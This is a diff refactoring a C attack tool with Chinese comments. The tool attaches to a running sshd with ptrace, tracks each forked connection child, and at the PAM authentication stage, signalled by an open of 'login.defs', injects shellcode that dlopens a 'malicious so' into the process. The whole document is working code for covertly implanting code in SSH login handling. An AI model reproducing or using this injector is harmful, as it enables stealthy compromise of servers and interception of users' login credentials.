+     * 因此写入位置是 标签地址 +2, 长度 8 字节(见 shellcode.s).
+     */
+    extern uint64_t _dlopen_mode_param1_s, _dlopen_mode_addr_s, _inject_start_s, _inject_end_s;
+    memcpy((void *)((long)&_dlopen_mode_param1_s + 2), &remote_code_ptr, sizeof(long));
+    memcpy((void *)((long)&_dlopen_mode_addr_s + 2), &dlopen_mode_addr, sizeof(long));
 
+    /* shellcode 紧跟在 so 路径字符串之后写入 */
+    remote_code_ptr += strlen(evil_so_path) + 1;
+    local_code_ptr = (uint8_t *)&_inject_start_s;
+    code_length = (uint32_t)((long)&_inject_end_s - (long)&_inject_start_s);
+    ptrace_writedata(target_pid, remote_code_ptr, local_code_ptr, code_length);
+    printf("+ [Inject][%d] Writing shellcode at: %p code length: %d\n", target_pid, remote_code_ptr, code_length);
+
+    /* rip 指向 shellcode+6, 从 nop 滑道中进入正式指令 */
+    regs.rip = (long)remote_code_ptr + 6;
+    ptrace_setregs(target_pid, &regs);
+    ptrace_continue(target_pid);
+    waitpid(target_pid, NULL, WUNTRACED);
+
+    /* 注入完成, 恢复原始寄存器并让子进程继续正常运行 */
+    printf("+ [Inject][%d] EvilSo injected. Recovering the regs...\n", target_pid);
+    ptrace_setregs(target_pid, &original_regs);
+
+    ptrace_continue(target_pid);
+
+    return 0;
 }
 
-
-
-int WaitforLibPAM(pid_t target_pid){
+/*
+ * sshd 子进程跟踪线程入口:
+ * attach 到 fork 出的 sshd 子进程, 监听其系统调用,
+ * 等它 open/openat "login.defs"(PAM 认证阶段特征)时注入恶意 so.
+ * 注入后继续等待子进程退出, 并将其压入 gc 栈等待 main 线程回收.
+ */
+int wait_for_libpam(pid_t target_pid)
+{
     struct user_regs_struct regs;
 
-    if ( ptrace_attach( target_pid ) == -1 ){
+    if (ptrace_attach(target_pid) == -1) {
+        printf("- [WaitforLibPAM][%d] attach failed\n", target_pid);
+        return -1;
+    }
+    if (ptrace_getregs(target_pid, &regs) == -1) {
+        printf("- [WaitforLibPAM][%d] Getregs error\n", target_pid);
+        return -1;
+    }
 
-        printf("- [WaitforLibPAM] WaitforLibPAM attach Failed\n" );
-        return -1;
-    }
-    if ( ptrace_getregs( target_pid, &regs ) == -1 ){
-        printf("- [WaitforLibPAM] Getregs Error\n" );
-        return -1;
-    }
-    long num,bit=0,finded = 0;
+    /* login.defs 会在 PAM 认证阶段被读取, 作为注入时机信号 */
     char *path = malloc(255);
-    char libsystemd[] = "login.defs";
-    while(1){
-        ptrace( PTRACE_SYSCALL, target_pid, NULL, 0  );
-        waitpid( target_pid, NULL, WUNTRACED );
-        num = ptrace(PTRACE_PEEKUSER, target_pid, ORIG_RAX * 8, NULL);
-        if(num ==257){
-            ptrace_getregs( target_pid, &regs ) ;
-            ptrace_readdata(target_pid,(void *)regs.rsi,path,255);
-            if(strstr(path,libsystemd)){
-                printf("+ [WaitforLibPAM][%d] SubProcess:openat find path: %s\n",target_pid,path);
-                ptrace_detach(target_pid);
-                Inject_Shellcode(target_pid);
-                break;
-            }
-        }
-        if(num ==2){
-            ptrace_getregs( target_pid, &regs ) ;
-            ptrace_readdata(target_pid,(void *)regs.rdi,path,255);
-            if(strstr(path,libsystemd)){
-                printf("+ [WaitforLibPAM][%d][openat] SubProcess:open find path: %s\n",target_pid,path);
-                ptrace_detach(target_pid);
-                Inject_Shellcode(target_pid);
-                break;
-            }
-        }
+    char trigger_file[] = "login.defs";
 
+    while (1) {
+        ptrace(PTRACE_SYSCALL, target_pid, NULL, 0);
+        waitpid(target_pid, NULL, WUNTRACED);
+
+        /* ORIG_RAX 在系统调用进入/退出两种 stop 时都保存着调用号.
+         * 入口 stop 时 rax 通常为 -ENOSYS(负数, 不触发), 出口 stop 时
+         * rax 为返回值, 因此无需区分两种 stop. */
+        long num = ptrace(PTRACE_PEEKUSER, target_pid, ORIG_RAX * 8, NULL);
+
+        if (num == 257) { /* openat, 路径参数在 rsi */
+            ptrace_getregs(target_pid, &regs);
+            ptrace_readdata(target_pid, (uint8_t *)regs.rsi, (uint8_t *)path, 255);
+            if (strstr(path, trigger_file)) {
+                printf("+ [WaitforLibPAM][%d] SubProcess: openat find path: %s\n", target_pid, path);
+                ptrace_detach(target_pid);
+                inject_shellcode(target_pid);
+                break;
+            }
+        }
+        if (num == 2) { /* open, 路径参数在 rdi */
+            ptrace_getregs(target_pid, &regs);
+            ptrace_readdata(target_pid, (uint8_t *)regs.rdi, (uint8_t *)path, 255);
+            if (strstr(path, trigger_file)) {
+                printf("+ [WaitforLibPAM][%d] SubProcess: open find path: %s\n", target_pid, path);
+                ptrace_detach(target_pid);
+                inject_shellcode(target_pid);
+                break;
+            }
+        }
     }
-    printf("+ [WaitforLibPAM][%d] Wait ChildProcess Ending\n",target_pid);
-    waitpid( target_pid,NULL,0 );
-    struct gcStack node;
-    node.up = gcs;
-    node.target_pid = target_pid;
-    gcs = &node;
 
-    printf("+ [WaitforLibPAM][%d] GC commit and ChildProcess End Successful\n",target_pid);
+    /* 子进程处理完连接退出后, 压栈等待 main 线程 manual_gc 回收 */
+    printf("+ [WaitforLibPAM][%d] Wait child process ending\n", target_pid);
+    waitpid(target_pid, NULL, 0);
+    struct gc_stack node;
+    node.prev = gc_stack_top;
+    node.target_pid = target_pid;
+    gc_stack_top = &node;
+
+    printf("+ [WaitforLibPAM][%d] GC commit and child process end successful\n", target_pid);
+    return 0;
 }
 
+/* pthread 线程包装: 参数以指针形式传入的是子进程 pid */
+static void *watch_child_thread(void *arg)
+{
+    wait_for_libpam((pid_t)(long)arg);
+    return NULL;
+}
 
 int main(int argc, char const *argv[])
 {
-    
+    if (argc < 2) {
+        printf("Usage: %s <sshd_pid>\n", argv[0]);
+        return -1;
+    }
 
-    pid_t                   target_pid;
-    target_pid = atoi (argv[1]);
+    pid_t target_pid = atoi(argv[1]);
     struct user_regs_struct regs;
 
-    
-    
-
-    if ( ptrace_attach( target_pid ) == -1 ){
-
-        printf("- [Main][%d] Attach Failed\n",target_pid );
+    if (ptrace_attach(target_pid) == -1) {
+        printf("- [Main][%d] Attach failed\n", target_pid);
         return -1;
     }
-    printf ("+ [Main][%d] Waiting for process...\n",target_pid);
-    printf ("+ [Main][%d] Getting Registers\n",target_pid);
-    if ( ptrace_getregs( target_pid, &regs ) == -1 ){
-        printf("- [Main][%d] Getregs Error\n" ,target_pid);
+    printf("+ [Main][%d] Waiting for process...\n", target_pid);
+    printf("+ [Main][%d] Getting registers\n", target_pid);
+    if (ptrace_getregs(target_pid, &regs) == -1) {
+        printf("- [Main][%d] Getregs error\n", target_pid);
         return -1;
     }
-    printf ("+ [Main][%d] RAX is %p\n",target_pid, (void*)regs.rax);
-    long num,subprocess;
-    // 初始化栈顶
-    struct gcStack bottom;
-    bottom.up=NULL;
+    printf("+ [Main][%d] RAX is %p\n", target_pid, (void *)regs.rax);
+
+    /* 初始化 gc 栈的哨兵栈底 */
+    struct gc_stack bottom;
+    bottom.prev = NULL;
     bottom.target_pid = 0;
-    gcs = &bottom;
+    gc_stack_top = &bottom;
 
+    printf("+ [Main][%d] Initialization stack successful\n", target_pid);
 
-
-    printf ("+ [Main][%d] Initialization stack successful\n",target_pid);
-
-    while(1){
-        if(gcs->up != NULL){
-            // need GC
-            printf ("+ [Main][%d] ManualGC Start\n",target_pid);
-            ManualGC(target_pid);
-            gcs = gcs->up;
-            printf ("+ [Main][%d] ManualGC End\n------------------------------------\n",target_pid);
-            
+    while (1) {
+        /* 栈顶不是哨兵节点说明有线程提交了待回收的子进程 */
+        if (gc_stack_top->prev != NULL) {
+            printf("+ [Main][%d] ManualGC start\n", target_pid);
+            manual_gc(target_pid);
+            gc_stack_top = gc_stack_top->prev;
+            printf("+ [Main][%d] ManualGC end\n------------------------------------\n", target_pid);
         }
-        ptrace( PTRACE_SYSCALL, target_pid, NULL, 0  );
-        waitpid( target_pid, NULL, WUNTRACED );
-        pthread_t id;
-        num = ptrace(PTRACE_PEEKUSER, target_pid, ORIG_RAX * 8, NULL);// 获得调用号值
-        //printf("+ Now Number = %d\n",num);
-        if(num == 56){
-            ptrace_getregs( target_pid, &regs ); // 获得调用结果
-            printf("+ [Main][%d] Process maybe = %ld \n",target_pid, regs.rax);
-            subprocess = regs.rax;
-            if(subprocess > 0){
-                //ManualGC(target_pid);
-                pthread_create(&id,NULL,(void *) WaitforLibPAM,subprocess);
+
+        ptrace(PTRACE_SYSCALL, target_pid, NULL, 0);
+        waitpid(target_pid, NULL, WUNTRACED);
+
+        long num = ptrace(PTRACE_PEEKUSER, target_pid, ORIG_RAX * 8, NULL); /* 当前系统调用号 */
+        if (num == 56) { /* clone: sshd fork 出处理连接的子进程, rax 为子进程 pid */
+            ptrace_getregs(target_pid, &regs);
+            printf("+ [Main][%d] Process maybe = %ld\n", target_pid, (long)regs.rax);
+            long child_pid = regs.rax;
+            if (child_pid > 0) {
+                /* 起线程去跟踪子进程, pid 通过指针参数传递 */
+                pthread_t tid;
+                pthread_create(&tid, NULL, watch_child_thread, (void *)child_pid);
             }
-
         }
-        
     }
 
-        return 0;
+    return 0;
 }
